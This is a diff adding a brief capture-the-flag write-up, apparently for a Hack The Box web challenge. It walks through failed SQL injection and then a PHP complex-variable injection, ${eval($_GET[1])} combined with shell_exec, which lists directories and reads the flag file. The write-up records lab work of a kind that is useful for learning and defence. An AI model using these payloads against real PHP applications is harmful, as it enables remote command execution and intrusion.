@@ -1,0 +1,11 @@
+1- we open the web site to check what we are working with
+2- we found that after pressing try again, a parameter is passed to the request
+3- we try some simple sqli testing and we don't find anything
+4- we check the web code and we find in TimeModel that they are using addslashes to escape strings (that's why it didn't worked befre)
+5- we try with multi-byte chars but nothing clear appears (only timezone data, we try some php reverse shell with multy-byte chars but we don't reach to nothing)
+6- we try with complex variables and we are able to run phpinfo() with ${phpinfo()}
+7- we add another eval() which receives input from another $_GET to allow multiple statements (beforehand we could only run 1 function)
+${eval($_GET[1])}&1=echo 5*5; echo "<br />something else"; -> this succesfully returned 25 and something else
+8- we run ${eval($_GET[1])}&1=$output = shell_exec('ls');echo "<pre>$output</pre>"; to see directory files but nothing interesting appears
+9- we run ${eval($_GET[1])}&1=$output = shell_exec('ls /');echo "<pre>$output</pre>"; to look for where the flag is located (if we follow the dockerfile provided) and we find flagcKqVl (the name is randomly generated)
+10 - we run ${eval($_GET[1])}&1=$output = shell_exec('cat /flagcKqVl');echo "<pre>$output</pre>"; and we get the flag HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}
